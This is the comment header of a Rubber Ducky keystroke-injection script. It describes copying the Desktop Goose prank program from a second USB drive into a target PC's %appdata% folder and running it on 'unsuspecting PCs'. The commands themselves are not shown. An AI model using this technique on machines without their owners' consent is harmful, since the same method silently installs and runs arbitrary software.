REM Name: RunGooseDesktop
REM Purpose: A Script that will automatically copy GooseDesktop to %appdata% from another drive "DUCKY" and run it
REM Encoder V2.6.3

REM GOOSE DESKTOP
REM Make unsuspecting PCs go *honk*
REM 
REM This script only works in combination with another USB drive named "DUCKY" being plugged into
REM the target computer at the same time. This second USB stick is the one that holds the actual
REM "payload" the Desktop Goose program (https://samperson.itch.io/desktop-goose). The folder that
REM you get from downloading and running the self-extracting zip archive from the itch.io link I
REM included above should be placed into the root directory of the "DUCKY" USB drive and renamed
REM to ".goose". Upon successful execution, the entire ".goose" folder will be copied to the
REM target PC's %appdata% folder from where the binary is launched as well - in the end, a popup
REM should appear telling you to eject the rubber ducky stick.
